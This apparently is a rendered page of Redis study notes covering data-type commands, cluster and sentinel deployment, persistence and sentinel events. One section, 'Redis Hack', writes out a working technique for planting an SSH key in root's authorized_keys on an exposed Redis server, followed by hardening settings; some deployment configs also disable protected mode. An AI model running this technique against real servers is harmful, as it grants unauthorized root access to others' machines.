+</span></span><span style=display:flex><span>hdel k f1 f2
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#8f5902;font-style:italic># ++</span>
+</span></span><span style=display:flex><span>hincrby k f increment
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>hgetall k
+</span></span><span style=display:flex><span><span style=color:#8f5902;font-style:italic># 返回哈希表 key 中的所有域</span>
+</span></span><span style=display:flex><span>hkeys k
+</span></span><span style=display:flex><span><span style=color:#8f5902;font-style:italic># 返回哈希表 key 中所有域的值</span>
+</span></span><span style=display:flex><span>hvals k
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#8f5902;font-style:italic># 同时将多个 field-value (域-值)对设置到哈希表 key 中</span>
+</span></span><span style=display:flex><span>hmset k f1 v1 f2 v2
+</span></span></code></pre></div><h3 id=set>set</h3><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span><span style=color:#8f5902;font-style:italic># 已经存在于集合的 member 元素将被忽略。</span>
+</span></span><span style=display:flex><span>sadd k m1 m2
+</span></span><span style=display:flex><span>smembers k
+</span></span><span style=display:flex><span><span style=color:#8f5902;font-style:italic># 集合中元素的数量</span>
+</span></span><span style=display:flex><span>scard k
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#8f5902;font-style:italic># 判断 member 元素是否集合 key 的成员</span>
+</span></span><span style=display:flex><span>sismember k m
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#8f5902;font-style:italic># 移除并返回集合中的一个随机元素</span>
+</span></span><span style=display:flex><span>spop k
+</span></span><span style=display:flex><span><span style=color:#8f5902;font-style:italic># 返回集合中的一个随机元素</span>
+</span></span><span style=display:flex><span>srandmember k
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#8f5902;font-style:italic># 移除集合 key 中的一个或多个member 元素，不存在的 member 元素会被忽略</span>
+</span></span><span style=display:flex><span>srem k m1 m2
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#8f5902;font-style:italic># 原子性操作  将 member 元素从 source 集合移动到 destination 集合</span>
+</span></span><span style=display:flex><span>smove src dest m
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>sdiff set1 set2
+</span></span><span style=display:flex><span>sdiffstore diffSet set1 set2
+</span></span><span style=display:flex><span>sunion set1 set2
+</span></span><span style=display:flex><span>sinterstore interSet set1 set2
+</span></span></code></pre></div><h3 id=zset>zset</h3><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>zadd k score1 m1 score2 m2 
+</span></span><span style=display:flex><span>zcard k
+</span></span><span style=display:flex><span>zincrby k increment m
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#8f5902;font-style:italic># 返回有序集 key 中， score 值在 min 和 max 之间</span>
+</span></span><span style=display:flex><span><span style=color:#8f5902;font-style:italic># (默认包括 score 值等于 min 或 max )的成员的数量</span>
+</span></span><span style=display:flex><span>zcount k min max 
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#8f5902;font-style:italic># 返回有序集 key 中，指定区间内的成员</span>
+</span></span><span style=display:flex><span><span style=color:#8f5902;font-style:italic># 其中成员的位置按 score 值递增(从小到大)来排序。</span>
+</span></span><span style=display:flex><span>zrange k start end withscores
+</span></span><span style=display:flex><span><span style=color:#8f5902;font-style:italic># 按 score 值递减(从大到小)</span>
+</span></span><span style=display:flex><span>zrevrange k start end withscores
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#8f5902;font-style:italic># 返回所有 score 值介于 min 和 max 之间</span>
+</span></span><span style=display:flex><span><span style=color:#8f5902;font-style:italic># (包括等于 min 或 max )的成员</span>
+</span></span><span style=display:flex><span>zrangebyscore k min max withscores limit offset count
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#8f5902;font-style:italic># 返回有序集 key 中成员 member 的排名</span>
+</span></span><span style=display:flex><span><span style=color:#8f5902;font-style:italic># 其中有序集成员按score 值递增(从小到大)顺序排列。</span>
+</span></span><span style=display:flex><span>zrank k m
+</span></span><span style=display:flex><span>zrevrank k m
+</span></span><span style=display:flex><span><span style=color:#8f5902;font-style:italic># 返回有序集 key 中，成员 member 的 score 值。</span>
+</span></span><span style=display:flex><span>zscore k m
+</span></span><span style=display:flex><span>zrem k m1 m2
+</span></span><span style=display:flex><span><span style=color:#8f5902;font-style:italic># 移除有序集 key 中，指定排名(rank)区间内的所有成员</span>
+</span></span><span style=display:flex><span>zremrangebyrank k start end
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>zremrangebyscore k min max
+</span></span></code></pre></div><h2 id=info>info</h2><h3 id=info-memory><code>info memory</code></h3><p><strong>used_memory</strong>, include used swap space</p><p><strong>used_memory_human</strong></p><p><strong>used_memory_rss</strong>, same as <code>top</code> or <code>ps</code>, exclude used swap space</p><p><strong>mem_fragmentation_ratio</strong> same as <code>used_memory_rss / used_memory</code> fragmentation ratio</p><p>health value is 1.03 for jemalloc</p><p><strong>mem_allocator</strong> libc, jemalloc or tcmalloc</p></div><div class=td-content style=page-break-before:always><h1 id=pg-8f0353598df69f3e7c11865a43db9194>1.2 - Redis Deploy</h1><h2 id=container>container</h2><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>docker run -it -d --name redis -p 6379:6379 redis
+</span></span></code></pre></div><h2 id=sentinel>sentinel</h2><h3 id=localhost>localhost</h3><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>config <span style=color:#204a87>set</span> protected-mode no
+</span></span></code></pre></div><h3 id=multi-master-3-master-3-slave-and-3-sentinel>multi master (3 master, 3 slave, and 3 sentinel)</h3><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>cat <span style=color:#4e9a06>&lt;&lt; EOF &gt; redis.conf
+</span></span></span><span style=display:flex><span><span style=color:#4e9a06>port 7000
+</span></span></span><span style=display:flex><span><span style=color:#4e9a06>daemonize yes
+</span></span></span><span style=display:flex><span><span style=color:#4e9a06>cluster-enabled yes
+</span></span></span><span style=display:flex><span><span style=color:#4e9a06>cluster-config-file 7000/nodes.conf
+</span></span></span><span style=display:flex><span><span style=color:#4e9a06>cluster-node-timeout 5000
+</span></span></span><span style=display:flex><span><span style=color:#4e9a06>appendonly yes
+</span></span></span><span style=display:flex><span><span style=color:#4e9a06>EOF</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>mkdir <span style=color:#0000cf;font-weight:700>7000</span> <span style=color:#0000cf;font-weight:700>7001</span> <span style=color:#0000cf;font-weight:700>7002</span> <span style=color:#0000cf;font-weight:700>7003</span> <span style=color:#0000cf;font-weight:700>7004</span> <span style=color:#0000cf;font-weight:700>7005</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>cat redis.conf <span style=color:#000;font-weight:700>|</span> sed s/7000/7000/g &gt; 7000/redis.conf
+</span></span><span style=display:flex><span>cat redis.conf <span style=color:#000;font-weight:700>|</span> sed s/7000/7001/g &gt; 7001/redis.conf
+</span></span><span style=display:flex><span>cat redis.conf <span style=color:#000;font-weight:700>|</span> sed s/7000/7002/g &gt; 7002/redis.conf
+</span></span><span style=display:flex><span>cat redis.conf <span style=color:#000;font-weight:700>|</span> sed s/7000/7003/g &gt; 7003/redis.conf
+</span></span><span style=display:flex><span>cat redis.conf <span style=color:#000;font-weight:700>|</span> sed s/7000/7004/g &gt; 7004/redis.conf
+</span></span><span style=display:flex><span>cat redis.conf <span style=color:#000;font-weight:700>|</span> sed s/7000/7005/g &gt; 7005/redis.conf
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#204a87>export</span> <span style=color:#000>redis_server</span><span style=color:#ce5c00;font-weight:700>=</span><span style=color:#4e9a06>&#39;../redis/src/redis-server&#39;</span>
+</span></span><span style=display:flex><span><span style=color:#000>$redis_server</span> 7000/redis.conf 
+</span></span><span style=display:flex><span><span style=color:#000>$redis_server</span> 7001/redis.conf 
+</span></span><span style=display:flex><span><span style=color:#000>$redis_server</span> 7002/redis.conf 
+</span></span><span style=display:flex><span><span style=color:#000>$redis_server</span> 7003/redis.conf 
+</span></span><span style=display:flex><span><span style=color:#000>$redis_server</span> 7004/redis.conf 
+</span></span><span style=display:flex><span><span style=color:#000>$redis_server</span> 7005/redis.conf 
+</span></span><span style=display:flex><span><span style=color:#8f5902;font-style:italic># three master &amp; three slave</span>
+</span></span><span style=display:flex><span>../redis/src/redis-trib.rb create --replicas <span style=color:#0000cf;font-weight:700>1</span> 127.0.0.1:7000 127.0.0.1:7001 <span style=color:#4e9a06>\
+</span></span></span><span style=display:flex><span><span style=color:#4e9a06></span>127.0.0.1:7002 127.0.0.1:7003 127.0.0.1:7004 127.0.0.1:7005
+</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>cat <span style=color:#4e9a06>&lt;&lt; EOF &gt; sentinel.conf
+</span></span></span><span style=display:flex><span><span style=color:#4e9a06>port 26379
+</span></span></span><span style=display:flex><span><span style=color:#4e9a06>daemonize yes
+</span></span></span><span style=display:flex><span><span style=color:#4e9a06>
+</span></span></span><span style=display:flex><span><span style=color:#4e9a06>sentinel monitor mymaster1 127.0.0.1 %port1 2
+</span></span></span><span style=display:flex><span><span style=color:#4e9a06>sentinel down-after-milliseconds mymaster1 60000
+</span></span></span><span style=display:flex><span><span style=color:#4e9a06>sentinel failover-timeout mymaster1 180000
+</span></span></span><span style=display:flex><span><span style=color:#4e9a06>sentinel parallel-syncs mymaster1 1
+</span></span></span><span style=display:flex><span><span style=color:#4e9a06>
+</span></span></span><span style=display:flex><span><span style=color:#4e9a06>sentinel monitor mymaster2 127.0.0.1 %port2 2
+</span></span></span><span style=display:flex><span><span style=color:#4e9a06>sentinel down-after-milliseconds mymaster2 60000
+</span></span></span><span style=display:flex><span><span style=color:#4e9a06>sentinel failover-timeout mymaster2 180000
+</span></span></span><span style=display:flex><span><span style=color:#4e9a06>sentinel parallel-syncs mymaster2 1
+</span></span></span><span style=display:flex><span><span style=color:#4e9a06>
+</span></span></span><span style=display:flex><span><span style=color:#4e9a06>sentinel monitor mymaster3 127.0.0.1 %port3 2
+</span></span></span><span style=display:flex><span><span style=color:#4e9a06>sentinel down-after-milliseconds mymaster3 60000
+</span></span></span><span style=display:flex><span><span style=color:#4e9a06>sentinel failover-timeout mymaster3 180000
+</span></span></span><span style=display:flex><span><span style=color:#4e9a06>sentinel parallel-syncs mymaster3 1
+</span></span></span><span style=display:flex><span><span style=color:#4e9a06>EOF</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>cat sentinel.conf <span style=color:#000;font-weight:700>|</span> sed s/26379/26379/g <span style=color:#000;font-weight:700>|</span> sed <span style=color:#4e9a06>&#39;s/%port1/1/g&#39;</span> &gt; sentinel_0.conf
+</span></span><span style=display:flex><span>cat sentinel.conf <span style=color:#000;font-weight:700>|</span> sed s/26379/36379/g <span style=color:#000;font-weight:700>|</span> sed <span style=color:#4e9a06>&#39;s/%port2//g&#39;</span> &gt; sentinel_1.conf
+</span></span><span style=display:flex><span>cat sentinel.conf <span style=color:#000;font-weight:700>|</span> sed s/26379/46379/g <span style=color:#000;font-weight:700>|</span> sed <span style=color:#4e9a06>&#39;s/%port3//g&#39;</span> &gt; sentinel_2.conf
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#204a87>export</span> <span style=color:#000>redis_server</span><span style=color:#ce5c00;font-weight:700>=</span><span style=color:#4e9a06>&#39;../redis/src/redis-server&#39;</span>
+</span></span><span style=display:flex><span><span style=color:#000>$redis_server</span> sentinel_0.conf --sentinel
+</span></span><span style=display:flex><span><span style=color:#000>$redis_server</span> sentinel_1.conf --sentinel
+</span></span><span style=display:flex><span><span style=color:#000>$redis_server</span> sentinel_2.conf --sentinel
+</span></span></code></pre></div><h3 id=single-master1-master-5-slave-and-3-sentinel>single master(1 master, 5 slave, and 3 sentinel)</h3><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>cat <span style=color:#4e9a06>&lt;&lt; EOF &gt; redis.conf
+</span></span></span><span style=display:flex><span><span style=color:#4e9a06>port 7000
+</span></span></span><span style=display:flex><span><span style=color:#4e9a06>daemonize yes
+</span></span></span><span style=display:flex><span><span style=color:#4e9a06>protected-mode no
+</span></span></span><span style=display:flex><span><span style=color:#4e9a06># cluster-enabled yes
+</span></span></span><span style=display:flex><span><span style=color:#4e9a06>cluster-config-file 7000/nodes.conf
+</span></span></span><span style=display:flex><span><span style=color:#4e9a06>cluster-node-timeout 5000
+</span></span></span><span style=display:flex><span><span style=color:#4e9a06>appendonly yes
+</span></span></span><span style=display:flex><span><span style=color:#4e9a06>EOF</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>mkdir <span style=color:#0000cf;font-weight:700>7000</span> <span style=color:#0000cf;font-weight:700>7001</span> <span style=color:#0000cf;font-weight:700>7002</span> <span style=color:#0000cf;font-weight:700>7003</span> <span style=color:#0000cf;font-weight:700>7004</span> <span style=color:#0000cf;font-weight:700>7005</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>cat redis.conf <span style=color:#000;font-weight:700>|</span> sed s/7000/7000/g &gt; 7000/redis.conf
+</span></span><span style=display:flex><span>cat redis.conf <span style=color:#000;font-weight:700>|</span> sed s/7000/7001/g &gt; 7001/redis.conf
+</span></span><span style=display:flex><span>cat redis.conf <span style=color:#000;font-weight:700>|</span> sed s/7000/7002/g &gt; 7002/redis.conf
+</span></span><span style=display:flex><span>cat redis.conf <span style=color:#000;font-weight:700>|</span> sed s/7000/7003/g &gt; 7003/redis.conf
+</span></span><span style=display:flex><span>cat redis.conf <span style=color:#000;font-weight:700>|</span> sed s/7000/7004/g &gt; 7004/redis.conf
+</span></span><span style=display:flex><span>cat redis.conf <span style=color:#000;font-weight:700>|</span> sed s/7000/7005/g &gt; 7005/redis.conf
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#204a87>export</span> <span style=color:#000>redis_server</span><span style=color:#ce5c00;font-weight:700>=</span><span style=color:#4e9a06>&#39;../redis/src/redis-server&#39;</span>
+</span></span><span style=display:flex><span><span style=color:#8f5902;font-style:italic># master</span>
+</span></span><span style=display:flex><span><span style=color:#000>$redis_server</span> 7000/redis.conf
+</span></span><span style=display:flex><span><span style=color:#8f5902;font-style:italic># slave</span>
+</span></span><span style=display:flex><span><span style=color:#000>$redis_server</span> 7001/redis.conf --slaveof 127.0.0.1 <span style=color:#0000cf;font-weight:700>7000</span>
+</span></span><span style=display:flex><span><span style=color:#000>$redis_server</span> 7002/redis.conf --slaveof 127.0.0.1 <span style=color:#0000cf;font-weight:700>7000</span>
+</span></span><span style=display:flex><span><span style=color:#000>$redis_server</span> 7003/redis.conf --slaveof 127.0.0.1 <span style=color:#0000cf;font-weight:700>7000</span>
+</span></span><span style=display:flex><span><span style=color:#000>$redis_server</span> 7004/redis.conf --slaveof 127.0.0.1 <span style=color:#0000cf;font-weight:700>7000</span>
+</span></span><span style=display:flex><span><span style=color:#000>$redis_server</span> 7005/redis.conf --slaveof 127.0.0.1 <span style=color:#0000cf;font-weight:700>7000</span>
+</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>cat <span style=color:#4e9a06>&lt;&lt; EOF &gt; sentinel.conf
+</span></span></span><span style=display:flex><span><span style=color:#4e9a06>port 26379
+</span></span></span><span style=display:flex><span><span style=color:#4e9a06>daemonize yes
+</span></span></span><span style=display:flex><span><span style=color:#4e9a06>protected-mode no
+</span></span></span><span style=display:flex><span><span style=color:#4e9a06>sentinel monitor mymaster 127.0.0.1 7000 2
+</span></span></span><span style=display:flex><span><span style=color:#4e9a06>sentinel down-after-milliseconds mymaster 60000
+</span></span></span><span style=display:flex><span><span style=color:#4e9a06>sentinel failover-timeout mymaster 180000
+</span></span></span><span style=display:flex><span><span style=color:#4e9a06>sentinel parallel-syncs mymaster 1
+</span></span></span><span style=display:flex><span><span style=color:#4e9a06>EOF</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>cat sentinel.conf <span style=color:#000;font-weight:700>|</span> sed s/26379/26379/g &gt; sentinel_0.conf
+</span></span><span style=display:flex><span>cat sentinel.conf <span style=color:#000;font-weight:700>|</span> sed s/26379/36379/g &gt; sentinel_1.conf
+</span></span><span style=display:flex><span>cat sentinel.conf <span style=color:#000;font-weight:700>|</span> sed s/26379/46379/g &gt; sentinel_2.conf
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#000>redis_server</span><span style=color:#ce5c00;font-weight:700>=</span><span style=color:#4e9a06>&#39;../redis/src/redis-server&#39;</span>
+</span></span><span style=display:flex><span><span style=color:#000>$redis_server</span> sentinel_0.conf --sentinel
+</span></span><span style=display:flex><span><span style=color:#000>$redis_server</span> sentinel_1.conf --sentinel
+</span></span><span style=display:flex><span><span style=color:#000>$redis_server</span> sentinel_2.conf --sentinel
+</span></span></code></pre></div></div><div class=td-content style=page-break-before:always><h1 id=pg-a50750f8fdbf9a4ffa760b43c06b1ce0>1.3 - Redis Hack</h1><h2 id=remote-login>Remote login</h2><h3 id=how-to-replay>How to replay</h3><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>ssh-keygen –t rsa
+</span></span><span style=display:flex><span><span style=color:#ce5c00;font-weight:700>(</span><span style=color:#204a87>echo</span> -e <span style=color:#4e9a06>&#34;\n\n&#34;</span><span style=color:#000;font-weight:700>;</span> cat id_rsa.pub<span style=color:#000;font-weight:700>;</span> <span style=color:#204a87>echo</span> -e <span style=color:#4e9a06>&#34;\n\n&#34;</span><span style=color:#ce5c00;font-weight:700>)</span> &gt; foo
+</span></span><span style=display:flex><span>$ cat foo <span style=color:#000;font-weight:700>|</span> redis-cli -h <span style=color:#000>$remote_ip</span> -x <span style=color:#204a87>set</span> crack
+</span></span><span style=display:flex><span>$ redis-cli -h <span style=color:#000>$remote_ip</span>
+</span></span><span style=display:flex><span><span style=color:#8f5902;font-style:italic># in redis CLI</span>
+</span></span><span style=display:flex><span>config <span style=color:#204a87>set</span> dir /root/.ssh/
+</span></span><span style=display:flex><span>config get dir
+</span></span><span style=display:flex><span>config <span style=color:#204a87>set</span> dbfilename <span style=color:#4e9a06>&#34;authorized_keys&#34;</span>
+</span></span><span style=display:flex><span><span style=color:#8f5902;font-style:italic># save /root/.ssh/authorized_keys</span>
+</span></span><span style=display:flex><span>save
+</span></span></code></pre></div><h3 id=how-to-avoid>How to avoid</h3><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span><span style=color:#8f5902;font-style:italic># redis.conf</span>
+</span></span><span style=display:flex><span><span style=color:#8f5902;font-style:italic># disable to change dbfilename via remote connetion</span>
+</span></span><span style=display:flex><span>rename-command FLUSHALL <span style=color:#4e9a06>&#34;&#34;</span>
+</span></span><span style=display:flex><span>rename-command CONFIG   <span style=color:#4e9a06>&#34;&#34;</span>
+</span></span><span style=display:flex><span>rename-command EVAL     <span style=color:#4e9a06>&#34;&#34;</span>
+</span></span><span style=display:flex><span>requirepass mypassword
+</span></span><span style=display:flex><span><span style=color:#204a87>bind</span> 127.0.0.1
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>groupadd -r redis <span style=color:#ce5c00;font-weight:700>&amp;&amp;</span> useradd -r -g redis redis
+</span></span></code></pre></div></div><div class=td-content style=page-break-before:always><h1 id=pg-7e41964b8f886f52f56e7ee3cfb9f724>1.4 - Redis Persistence</h1><h2 id=persistence>persistence</h2><h3 id=rdb>RDB</h3><p>fork sub process periodically and dump to a single file</p><h3 id=aof-appended-only-file>AOF, appended only file</h3><p>log every writer and delete records</p><pre tabindex=0><code class=language-conf data-lang=conf># after 300s, dump if at least 10 key changed
+save 300 10
+
+# aof, always no
+# every second
+appendfsync everysec
+
+# grow 100% then rewrite
+auto-aof-rewrite-percentage 100
+auto-aof-rewrite-min-size 64mb
+</code></pre></div><div class=td-content style=page-break-before:always><h1 id=pg-2c1626fdaa60068350cecb90c22c19f0>1.5 - Redis Sentinel</h1><h2 id=sentinel>sentinel</h2><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>ping
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>info replication
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>info server
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>info sentinel
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>sentinel auth-pass &lt;name&gt; &lt;password&gt;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>sentinel masters
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>sentinel master &lt;name&gt;
+</span></span><span style=display:flex><span>sentinel slaves &lt;name&gt;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#8f5902;font-style:italic># 返回指定master的ip和端口</span>
+</span></span><span style=display:flex><span><span style=color:#8f5902;font-style:italic># 正在进行failover或者failover已经完成，将显示被提升为master的slave的ip和端口</span>
+</span></span><span style=display:flex><span>sentinel get-master-addr-by-name &lt;name&gt; 
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#8f5902;font-style:italic># 重置名字匹配该正则表达式的所有的master的状态信息</span>
+</span></span><span style=display:flex><span>sentinel reset &lt;pattern&gt; 
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#8f5902;font-style:italic># 执行failover，无需其他sentinel同意</span>
+</span></span><span style=display:flex><span>sentinel failover &lt;master name&gt; 
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#8f5902;font-style:italic># 监听一个新的master</span>
+</span></span><span style=display:flex><span>sentinel monitor &lt;name&gt; &lt;ip&gt; &lt;port&gt; &lt;quorum&gt;
+</span></span><span style=display:flex><span><span style=color:#8f5902;font-style:italic># 放弃对某个master的监听</span>
+</span></span><span style=display:flex><span>sentinel remove &lt;name&gt;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#8f5902;font-style:italic># 改变指定master的配置，支持多个&lt;option&gt; &lt;value&gt;</span>
+</span></span><span style=display:flex><span>sentinel <span style=color:#204a87>set</span> &lt;name&gt; &lt;option&gt; &lt;value&gt;
+</span></span></code></pre></div><h3 id=conf>conf</h3><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span><span style=color:#8f5902;font-style:italic># 26379</span>
+</span></span><span style=display:flex><span>redis-sentinel /path/to/sentinel.conf
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>redis-server /path/to/sentinel.conf --sentinel
+</span></span></code></pre></div><h3 id=sentinelconf>sentinel.conf</h3><p>sentinel monitor mymaster 127.0.0.1 6379 2
+sentinel down-after-milliseconds mymaster 60000
+sentinel failover-timeout mymaster 180000
+sentinel parallel-syncs mymaster 1</p><p>sentinel monitor resque 192.168.1.3 6380 4
+sentinel down-after-milliseconds resque 10000
+sentinel failover-timeout resque 180000
+sentinel parallel-syncs resque 5</p><h3 id=sentinel-monitor-mymaster-127001-6379-2>sentinel monitor mymaster 127.0.0.1 6379 2</h3><p>2 当集群中有2个sentinel认为master死了时，才能真正认为该master已经不可用了</p><h3 id=sentinel-option_name-master_name-option_value>sentinel &lt;option_name> &lt;master_name> &lt;option_value></h3><p>所有的配置都可以在运行时用命令SENTINEL SET command动态修改。</p><h4 id=down-after-milliseconds>down-after-milliseconds</h4><p>sentinel会向master发送心跳PING来确认master是否存活，如果master在“一定时间范围”内不回应PONG 或者是回复了一个错误消息，那么这个sentinel会主观地(单方面地)认为这个master已经不可用了</p><h4 id=parallel-syncs>parallel-syncs</h4><p>在发生failover主备切换时，这个选项指定了最多可以有多少个slave同时对新的master进行同步，这个数字越小，完成failover所需的时间就越长，但是如果这个数字越大，就意味着越多的slave因为replication而不可用。可以通过将这个值设为 1 来保证每次只有一个slave处于不能处理命令请求的状态。</p><h4 id=heading></h4><p>sentinel对于不可用有两种不同的看法，一个叫主观不可用(SDOWN),另外一个叫客观不可用(ODOWN)。SDOWN是sentinel自己主观上检测到的关于master的状态，ODOWN需要一定数量的sentinel达成一致意见才能认为一个master客观上已经宕掉，各个sentinel之间通过命令SENTINEL is_master_down_by_addr来获得其它sentinel对master的检测结果。</p><p>min-slaves-to-write 1
+min-slaves-max-lag 10</p><p>当一个redis是master时，如果它不能向至少一个slave写数据(上面的min-slaves-to-write指定了slave的数量)，它将会拒绝接受客户端的写请求。由于复制是异步的，master无法向slave写数据意味着slave要么断开连接了，要么不在指定时间内向master发送同步数据的请求了(上面的min-slaves-max-lag指定了这个时间)</p><h3 id=向sentinel订阅消息>向sentinel订阅消息</h3><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>psubscribe *
+</span></span><span style=display:flex><span>psubscribe sdown
+</span></span></code></pre></div><pre tabindex=0><code>&lt;instance-type&gt; &lt;name&gt; &lt;ip&gt; &lt;port&gt; @ &lt;master-name&gt; &lt;master-ip&gt; &lt;master-port&gt;
+
+所有收到的消息的消息格式
+
+    +reset-master &lt;instance details&gt; -- 当master被重置时.
+    +slave &lt;instance details&gt; -- 当检测到一个slave并添加进slave列表时.
+    +failover-state-reconf-slaves &lt;instance details&gt; -- Failover状态变为reconf-slaves状态时
+    +failover-detected &lt;instance details&gt; -- 当failover发生时
+    +slave-reconf-sent &lt;instance details&gt; -- sentinel发送SLAVEOF命令把它重新配置时
+    +slave-reconf-inprog &lt;instance details&gt; -- slave被重新配置为另外一个master的slave，但数据复制还未发生时。
+    +slave-reconf-done &lt;instance details&gt; -- slave被重新配置为另外一个master的slave并且数据复制已经与master同步时。
+    -dup-sentinel &lt;instance details&gt; -- 删除指定master上的冗余sentinel时 (当一个sentinel重新启动时，可能会发生这个事件).
+    +sentinel &lt;instance details&gt; -- 当master增加了一个sentinel时。
+    +sdown &lt;instance details&gt; -- 进入SDOWN状态时;
+    -sdown &lt;instance details&gt; -- 离开SDOWN状态时。
+    +odown &lt;instance details&gt; -- 进入ODOWN状态时。
+    -odown &lt;instance details&gt; -- 离开ODOWN状态时。
+    +new-epoch &lt;instance details&gt; -- 当前配置版本被更新时。
+    +try-failover &lt;instance details&gt; -- 达到failover条件，正等待其他sentinel的选举。
+    +elected-leader &lt;instance details&gt; -- 被选举为去执行failover的时候。
+    +failover-state-select-slave &lt;instance details&gt; -- 开始要选择一个slave当选新master时。
+    no-good-slave &lt;instance details&gt; -- 没有合适的slave来担当新master
+    selected-slave &lt;instance details&gt; -- 找到了一个适合的slave来担当新master
+    failover-state-send-slaveof-noone &lt;instance details&gt; -- 当把选择为新master的slave的身份进行切换的时候。
+    failover-end-for-timeout &lt;instance details&gt; -- failover由于超时而失败时。
+    failover-end &lt;instance details&gt; -- failover成功完成时。
+    switch-master &lt;master name&gt; &lt;oldip&gt; &lt;oldport&gt; &lt;newip&gt; &lt;newport&gt; -- 当master的地址发生变化时。通常这是客户端最感兴趣的消息了。
+    +tilt -- 进入Tilt模式。
+    -tilt -- 退出Tilt模式。
+</code></pre></div><div class=td-content style=page-break-before:always><h1 id=pg-81887b63bae4473c1844dee135eb615e>1.6 - Redis Type</h1><h2 id=redisobject>redisObject</h2><p>Redis 类型系统的核心，数据库中的每个键、值，以及Redis 本身处理的参数，都表示为这种数据类型</p><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#8f5902;font-style:italic>// server.h
+</span></span></span><span style=display:flex><span><span style=color:#8f5902;font-style:italic></span><span style=color:#8f5902;font-style:italic>/* The actual Redis Object */</span>
+</span></span><span style=display:flex><span><span style=color:#8f5902;font-style:italic>#define OBJ_STRING 0    </span><span style=color:#8f5902;font-style:italic>/* String object. */</span><span style=color:#8f5902;font-style:italic>
+</span></span></span><span style=display:flex><span><span style=color:#8f5902;font-style:italic>#define OBJ_LIST 1      </span><span style=color:#8f5902;font-style:italic>/* List object. */</span><span style=color:#8f5902;font-style:italic>
+</span></span></span><span style=display:flex><span><span style=color:#8f5902;font-style:italic>#define OBJ_SET 2       </span><span style=color:#8f5902;font-style:italic>/* Set object. */</span><span style=color:#8f5902;font-style:italic>
